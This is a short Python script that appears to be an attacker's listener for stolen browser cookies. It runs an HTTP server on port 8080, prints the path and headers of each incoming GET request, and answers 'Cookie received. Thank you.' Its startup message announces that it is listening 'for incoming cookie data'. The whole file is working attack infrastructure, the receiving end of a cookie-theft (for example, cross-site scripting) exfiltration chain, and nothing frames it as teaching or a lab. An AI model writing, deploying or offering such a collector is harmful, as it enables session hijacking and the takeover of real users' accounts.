from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Received GET request: {self.path}")
        print(f"[+] Headers: {self.headers}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Cookie received. Thank you.")

def run(server_class=HTTPServer, handler_class=RedirectHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[*] Listening on port {port} for incoming cookie data...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
